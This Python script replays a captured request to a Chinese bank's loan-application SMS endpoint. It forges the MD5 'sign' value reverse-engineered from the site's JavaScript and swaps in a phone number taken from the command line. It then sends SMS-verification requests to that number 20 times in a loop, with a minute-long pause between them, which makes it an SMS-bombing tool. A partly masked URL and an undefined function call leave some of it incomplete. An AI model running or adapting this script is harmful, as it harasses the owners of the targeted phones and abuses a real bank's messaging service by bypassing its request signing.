'''


https://fcloud. XXXXXXXXXXXXXXXXXXXXXXXXXX
post
报文重放

在js中  追踪分析  
          2023.6.14
'''

# coding=utf-8


import requests
import base64
import time
import datetime
import random
import json
import re
import os
import sys
import hashlib
# from multiprocessing import Process
# import cv2
# from PIL import Image
# import numpy as np
# from paddleocr import PaddleOCR, draw_ocr
# import pytesseract
import string

# import random

from requests.cookies import RequestsCookieJar

requests.packages.urllib3.disable_warnings()

url1 = 'https:///xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'

############ 为防止 伤害， url1设置了XXXXXXXXXXXXXXXXX  

jsessionid = 'sajssdk_2015_cross_new_user=1; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22188b8834f10c13-0e066f643bb0a8-26031d51-1049088-188b8834f11655%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22%24device_id%22%3A%22188b8834f10c13-0e066f643bb0a8-26031d51-1049088-188b8834f11655%22%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTg4YjhlYjFiY2Q2MjMtMDY4YWYwNTY4NmZjZmFjLTI2MDMxZDUxLTEwNDkwODgtMTg4YjhlYjFiY2UxMGQ0In0%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%7D'

# serverid = 'SERVERID=5fb42a345d220308095c0c6752bab31e|1677401812|1677401693'
cookies = jsessionid
# post
headers1 = {
    'Accept': 'application/json, text/plain, */*'
    , 'Accept-Encoding': 'gzip, deflate, br'
    , 'Accept-Language': 'zh-CN,zh;q=0.9'
    , 'Connection': 'keep-alive'
    # Content-Length: 0
    , 'Content-Type': 'application/x-www-form-urlencoded'
    , 'Cookie': cookies
    , 'Host': 'fcloud.zjtlcb.com'
    , 'Origin': 'https://fcloud.zjtlcb.com'
    # ,'PE-AJAX': 'true'
    ,
    'Referer': 'https://*******************ANK'
    , 'Sec-Fetch-Dest': 'empty'
    , 'Sec-Fetch-Mode': 'cors'
    , 'Sec-Fetch-Site': 'same-origin'
    ,
    'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1'
    # ,'X-Requested-With': 'XMLHttpRequest'
}


def uuid() -> str:
    # old = '0SK2UHGWKLMJU'

    new_str = '0' + ''.join(random.sample(string.ascii_letters + string.digits, 12))
    new_str = new_str.upper()
    new_str.replace('1', 'Z')  #### 特定的转换
    # print( new_str )
    return new_str


def md5(str1) -> str:
    m = hashlib.md5()
    m.update(str1.encode('UTF-8'))
    new_str = m.hexdigest()
    new0 = new_str.upper()
    # print(str1)
    # print(new0)
    return new0


def process1(tel) -> int:
    global jsessionid
    global serverid

    print(' begin http   post  => ' + url1)

    payload = {
        "reqData": {
            "head": {
                "txSno": "HD1686729650879",
                "mrchSno": "HD1686729650879",
                "txTime": "20230614160050",
                "channelId": "L081011"
            },
            "body": {
                "bussType": "TAIELOAN",
                "mobile": "18100007766",
                "txSno": "HD1686729650879",
                "channelId": "L081011",
                "sign": "3C5EE631533C69FBDF8D21ECF0B56973"
            }
        }
    }

    ooo = "{\"bussType\":******************************545743\"}"
    sign = md5(ooo)
    #print(sign)
    '''
	sign = md5(ooo)
	sign  === "2F54B20957B024E6070C4FCE7F52AA27"
	'''

    new_HD = 'HD' + str(int(time.time() * 1000))
    new_TIME = datetime.date.strftime(datetime.datetime.today(), "%Y%m%d%H%M%S")
    #print(new_HD, ' ', new_TIME)

    payload['reqData']['head']['txSno'] = new_HD
    payload['reqData']['head']['mrchSno'] = new_HD
    payload['reqData']['head']['txTime'] = new_TIME
    payload['reqData']['body']['txSno'] = new_HD
    payload['reqData']['body']['mobile'] = tel

    ooo1 = ooo.replace('18100007766', tel)
    ooo2 = ooo1.replace('HD1686731545743', new_HD)

    sign2 = md5(ooo2)
    payload['reqData']['body']['sign'] = sign2

    #print(sign2)

    r = requests.post(url1, headers=headers1, data=json.dumps(payload), verify=False)
    # print(r.status_code)
    if (r.status_code != 200):
        print('error in   http    return is -> ' + str(r.status_code)   )
        return -1
    else:
        print('  https    is  OK      ')

    print(r.text)

    '''
	cookie_res = requests.utils.dict_from_cookiejar(r.cookies)

	#print(cookie_res)
	
	if cookie_res.get('JSESSIONID') != None:
		print(cookie_res)
		jsessionid  = 'JSESSIONID=' +  cookie_res['JSESSIONID']
	if cookie_res.get('SERVERID') != None:
		print(cookie_res)
		serverid = 'SERVERID=' + cookie_res['SERVERID']
		cookies_new = jsessionid + ';' + serverid
		headers1['Cookie'] = cookies_new
	'''

    # print ( )
    ret = json.loads(r.text)

    if ret['errorCode'] == '000000':
        print(' 发送 短信 成功 ！！！！--> ' + tel + '\n')
        return 0
    else:
        print(ret)
        return -1


def main():
    phone = [
        '18100001101',
        '18100001102',
        '18100001103',
        '18100001104',
        '18100001105',
        '18100001106',
        '18100001107',
        '18100001108',
        '18100001109',
        '18100001110'
    ]
    for jj in range(10):
        if jj > 0:
            print(' sleep 60s .... ')
        # time.sleep(58)
        print('\n    第 ' + str(jj + 1) + ' 次 发送 ')
        process2(phone[jj])

    return


if __name__ == '__main__':

    # main()
    # time.sleep(300)

    mobile = str(sys.argv[1])
    succ = 0
    for jj in range(20) :
        if jj > 0:
            print(' sleep 60s .... ')
            for jjj in range(12) :
                print ( 'rest time is :' , 60 - jjj*5 , ' second ')
                time.sleep(5)
            #time.sleep(60)
        print('\n    第 ' + str(jj + 1) + ' 次 发送 ')
        if process1(mobile) == 0:
            succ += 1
    # time.sleep(60)

    print('\n\n     game over    !!!!!!!!  成功总数->  ' + str(succ))
